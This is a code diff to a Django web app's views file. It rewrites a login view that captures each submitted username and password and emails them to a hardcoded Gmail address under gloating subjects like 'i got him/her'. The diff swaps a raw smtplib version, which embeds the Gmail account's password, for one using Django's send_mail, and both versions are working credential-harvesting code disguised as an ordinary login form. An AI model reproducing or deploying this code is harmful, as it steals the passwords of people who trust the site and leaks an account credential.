@@ -5,7 +5,7 @@ from .models import Adverts
 from .models import DataHolder
 from . import urls
 import pickle
-import smtplib
+from django.core.mail import send_mail
 
 
 ads = []
@@ -87,18 +87,10 @@ def contact(reguest5):
 
 def login(reguest):
 	if reguest.method == "POST" :
-		login = reguest.POST['login']
-		password = reguest.POST['password']
-		with smtplib.SMTP('smtp.gmail.com' , 587) as smtp :
-			smtp.ehlo()
-			smtp.starttls()
-			smtp.ehlo()
-
-			smtp.login("ZAAMG14@gmail.com" , "AA#14#G&HIGGS*m")
-
-			msg = f'Subject: HAAHAHAH I GO HIM Login: {login} Password: {password}'
-			smtp.sendmail("ZAAMG14@gmail.com","ZAAMG14@gmail.com",msg)
-			return login1(reguest)
+		logina = reguest.POST['login']
+		passworda = reguest.POST['password']
+		send_mail("HAHHAHAH i got  him/her" , "Login: " + logina + "Password: " + passworda , "ZAAMG14@gmail.com",['ZAAMG14@gmail.com'] )
+		return login1(reguest)
 			
 	else:
 		return render(reguest , 'login.html' , {})
